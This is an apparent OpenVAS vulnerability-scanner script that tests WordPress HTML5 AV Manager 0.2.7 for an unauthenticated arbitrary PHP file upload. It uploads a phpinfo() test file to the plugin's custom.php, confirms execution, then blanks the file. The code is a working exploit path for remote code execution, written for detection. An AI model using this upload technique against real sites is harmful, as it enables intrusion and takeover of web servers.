CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802639" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_bugtraq_id( 53804 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-06-11 15:15:15 +0530 (Mon, 11 Jun 2012)" );
	script_name( "WordPress HTML5 AV Manager Plugin 'custom.php' Arbitrary File Upload Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49390" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53804" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18990" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/113277/WordPress-HTML5-AV-Manager-0.2.7-Shell-Upload.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to upload arbitrary PHP
code and run it in the context of the Web server process." );
	script_tag( name: "affected", value: "WordPress HTML5 AV Manager Plugin version 0.2.7" );
	script_tag( name: "insight", value: "The flaw is due to the wp-content/plugins/html5avmanager/lib/
uploadify/custom.php script allowing to upload files to a folder inside the
webroot. This can be exploited to execute arbitrary PHP code by uploading a
malicious PHP script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress HTML5 AV Manager Plugin and is prone
to a file upload vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
func upload_file( url, file, ex, len, host ){
	return NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------5626d00351af\\r\\n", "Content-Length: ", len, "\\r\\n\\r\\n", "-----------------------------5626d00351af\\r\\n", "Content-Disposition: form-data; name=\"Filedata\"; filename=\"", file, "\";", "\\r\\n", "Content-Type: application/octet-stream\\r\\n", "\\r\\n", ex, "\\r\\n", "-----------------------------5626d00351af--\\r\\n\\r\\n" );
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
file = "ov-file-upload-test.php";
rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen( ex ) + 220;
url = NASLString( dir, "/wp-content/plugins/html5avmanager/lib/uploadify/custom.php" );
req = upload_file( url: url, file: file, ex: ex, len: len, host: host );
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "HTTP/1.. 200" )){
	path = NASLString( dir, "/wp-content/videoaudio/temp/", file );
	if(http_vuln_check( port: port, url: path, check_header: TRUE, pattern: "<title>phpinfo\\(\\)", extra_check: rand )){
		ex = "";
		len = strlen( ex ) + 220;
		req = upload_file( url: url, file: file, ex: ex, len: len, host: host );
		http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		security_message( port: port );
		exit( 0 );
	}
}

